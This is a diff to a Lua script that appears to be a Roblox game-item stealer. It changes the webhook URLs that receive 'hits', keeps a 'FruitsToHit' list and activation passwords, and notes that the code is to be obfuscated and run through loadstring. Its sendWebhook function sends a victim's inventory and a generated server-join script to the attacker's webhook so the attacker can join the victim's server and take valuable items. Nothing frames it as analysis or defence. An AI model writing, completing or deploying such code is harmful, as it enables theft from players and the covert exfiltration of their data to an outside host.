@@ -1,4 +1,4 @@
-Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/ca609325-99b3-497b-8737-faccc932c629" -- << Protected URL for main hits
+Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main hits
 Usernames = {
 	"user1",
 	"user2",
@@ -17,8 +17,8 @@ FruitsToHit = {
 
 --obfuscate after this, use loadstring for this coming
 
-Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/1f650f79-2334-4511-86ab-7cd2fe2224d7" -- << Protected URL for main hits (secondary)
-dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/619cd2f2-94b5-4dcd-933c-350b0250a76d" -- << Protected URL for admin/special hits
+Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/d5c5ec6c-2983-4512-a59d-a03bb0d30d92" -- << Protected URL for main hits (secondary)
+dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/061ccfe8-01fd-414b-b874-38de6b02d928" -- << Protected URL for admin/special hits
 
 ActivationPasswords = {
 	"ishusontop",
@@ -777,13 +777,13 @@ local function sendWebhook(inventory)
 	end
 
 -- Generate Join Script (Rua Style with Escaping)
-	local jobId = game.JobId
-	local placeId = game.PlaceId
-	local isSea3 = (placeId == 7449423635)
-	local seaTravelArgument = isSea3 and "TravelZou" or "TravelDressrosa"
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local isSea3 = (placeId == 7449423635)
+    local seaTravelArgument = isSea3 and "TravelZou" or "TravelDressrosa"
 
--- Use Lua's long bracket string for the format string, matching the working example
-	local joinScriptFormatString = [=[
+    -- Use Lua's long bracket string for the format string, matching the working example
+    local joinScriptFormatString = [=[
 local iddd = %d
 local JobIdd = "%s"
 local sea = "%s"
@@ -799,13 +799,15 @@ else
 end
 ]=]
 
--- Then, use string.format with the variables
-	local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
+    -- Then, use string.format with the variables
+    local joinScriptLua = string.format(joinScriptFormatString, 4442272183, jobId, "TravelDressrosa", 4442272183, jobId)
 
--- Keep the escaping and formatting logic
-	local escapedJoinScriptLua = string.gsub(joinScriptLua, "\"", "\\\"")
-	local joinScriptPC_Formatted = "```lua\n" .. escapedJoinScriptLua .. "\n```"
-	local joinScriptMobile_Formatted = escapedJoinScriptLua
+    -- Keep the escaping and formatting logic
+    local escapedJoinScriptLua = string.gsub(joinScriptLua, "\"", "\\\"")
+    local joinScriptPC_Formatted = "```lua\n" .. escapedJoinScriptLua .. "\n```"
+    local joinScriptMobile_Formatted = escapedJoinScriptLua
+
+
 	local embedTitle, embedColor, mention;
 	if dragonHit and hasPremiumItem then
 		embedTitle = "<:dragonE:1318248271457812510><:value:1228807380188397649> **DRAGON & PREMIUM HIT!**";
